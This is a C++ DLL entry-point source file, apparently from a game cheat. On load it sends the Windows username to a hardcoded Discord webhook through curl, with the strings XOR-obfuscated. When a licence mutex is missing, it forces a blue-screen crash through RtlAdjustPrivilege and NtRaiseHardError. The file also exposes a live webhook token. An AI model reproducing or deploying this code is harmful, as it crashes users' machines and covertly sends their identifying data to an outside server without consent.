#include "includes.h"

#pragma comment(lib, "ntdll.lib")

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

void BlueScreen() {
	BOOLEAN bl;
	ULONG Response;
	RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
}
void main_thread(HINSTANCE hModule) {
	char name[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserNameA(name, &username_len);
	std::string webhook_url = xorstr("https://discord.com/api/webhooks/826235329924825109/2oSb40nw1QdXf4LocCi-ILsZNBiosvE7F1drHk3NAZRQiEYCOnNp4qCyap-JmILw92kZ");
	std::string avatar_url = xorstr("https://i.imgur.com/9FKjGO8.png");
	std::string winname = name;
	std::string mutex_not_found = xorstr("curl --data \"username=plusminus&content=got bluescreened: ") + winname + xorstr("&avatar_url=") + avatar_url + "\" " + webhook_url;
	std::string fail = xorstr("curl --data \"username=plusminus&content=login failed: ") + winname + xorstr("&avatar_url=") + avatar_url + "\" " + webhook_url;
	std::string success = xorstr("curl --data \"username=plusminus&content=login successful: ") + winname + xorstr("&avatar_url=") + avatar_url + "\" " + webhook_url;
#ifdef noauth
	Start( );
	hk__( );
#else
	HANDLE hMutex = OpenMutexA(SYNCHRONIZE, FALSE, xorstr("1bo7MMSCOc6Nod3iV4BK"));
	if (!hMutex) {
		system(mutex_not_found.c_str());
		BlueScreen();
		//MessageBox(0, xorstr(L"helo monky nice crack attempt LAWL"), 0, 0);
		exit(0);
	}
	else {
		CloseHandle(hMutex);
		system(success.c_str());
		
		Start( );
		hk__( );
	}
#endif
}
bool DllMain(HMODULE hMod, std::uint32_t call_reason, void*) {
	if (call_reason != DLL_PROCESS_ATTACH)
		return false;

#ifdef disable
#else
	const auto handle = CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(main_thread), hMod, 0, nullptr);
	if (handle != NULL)
		CloseHandle(handle);
#endif

	return true;
}